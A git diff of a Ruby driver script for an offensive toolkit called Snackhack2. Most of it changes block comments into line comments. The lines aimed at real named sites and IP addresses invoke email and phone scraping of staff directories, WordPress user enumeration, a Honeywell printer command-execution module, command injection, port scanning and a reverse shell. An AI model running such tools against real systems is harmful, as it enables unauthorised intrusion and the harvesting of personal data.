@@ -45,8 +45,6 @@ require './lib/snackHack2'
 
 ## Get a site's meta data
 
-
-
 ## Grab gooogle Analytics from a site. this could be used to find similar sites
 
 # t = Snackhack2::GoogleAnalytics.new("https://training.vib.be/drupal/login")
@@ -96,73 +94,53 @@ require './lib/snackHack2'
 
 # wp = Snackhack2::PhoneNumber.new('https://pohs.grcsu.org/staff-directory/')
 # wp.spider
-=begin
-e = Snackhack2::Email.new("https://www.tupeloschools.com/leadership/staff-directory")
-puts e.max_depth
-e.max_depth = 2
-puts e.max_depth
-=end
+# e = Snackhack2::Email.new("https://www.tupeloschools.com/leadership/staff-directory")
+# puts e.max_depth
+# e.max_depth = 2
+# puts e.max_depth
 
 # d = Snackhack2::Drupal.new("https://physiologycore.umn.edu/")
 # d.all
-=begin
-wp = Snackhack2::WordPress.new("https://adk.org")
-wp.all_in_one_seo
-
-=end
+# wp = Snackhack2::WordPress.new("https://adk.org")
+# wp.all_in_one_seo
+#
 
 # Snackhack2::BannerGrabber.new("http://95.142.29.235").apache2
-=begin
-s = Snackhack2::HoneywellPM43.new("http://81.84.149.129:80")
-
-s.command = "id"
-puts s.command
-s.run
-=end
+# s = Snackhack2::HoneywellPM43.new("http://81.84.149.129:80")
+#
+# s.command = "id"
+# puts s.command
+# s.run
 # sm = Snackhack2::SiteMap.new("https://cryptogrinders.us")
 # tc = Snackhack2::TomCat.new("https://recrutements-ec.univ-lille.fr")
 # tc.run
-=begin
-ss = Snackhack2::ScreenShot.new
-ss.zip = "test.zip"
-ss.run
+# ss = Snackhack2::ScreenShot.new
+# ss.zip = "test.zip"
+# ss.run
 # Snackhack2::brute_force("https://netflix.com")
-=end
-# 
-=begin
-cj = Snackhack2::CommandInjection.new
-cj.prompt = "test"
-cj.wlrmdr_With_prompt
-=end
+#
+# cj = Snackhack2::CommandInjection.new
+# cj.prompt = "test"
+# cj.wlrmdr_With_prompt
 
-=begin
-dd
-=end
-=begin
-tcp = Snackhack2::PortScan.new
-tcp.count = 2
-tcp.test
-=end
-=begin
-ga = Snackhack2::GoogleAnalytics.new
-ga.site = "https://hackex.net"
-ga.run
-=end
+# dd
+# tcp = Snackhack2::PortScan.new
+# tcp.count = 2
+# tcp.test
+# ga = Snackhack2::GoogleAnalytics.new
+# ga.site = "https://hackex.net"
+# ga.run
 
-=begin
-wp = Snackhack2::WordPress.new
-wp.site = "https://themeisle.com"
-wp.users
-=end
-=begin
-s = Snackhack2::IpLookup.new
-s.site = "https://hackex.net"
-s.run
-
-rs = Snackhack2::ReverseShell.new
-rs.ip = "1270.0.01"
-rs.port = "4444"
-rs.run
-=end
-cew = Snackhack2::CryptoExtractWebsite.new("https://encodebase64.us", save_file: true)
+# wp = Snackhack2::WordPress.new
+# wp.site = "https://themeisle.com"
+# wp.users
+# s = Snackhack2::IpLookup.new
+# s.site = "https://hackex.net"
+# s.run
+#
+# rs = Snackhack2::ReverseShell.new
+# rs.ip = "1270.0.01"
+# rs.port = "4444"
+# rs.run
+cew = Snackhack2::CryptoExtractWebsite.new('https://encodebase64.us', save_file: true)
 cew.run
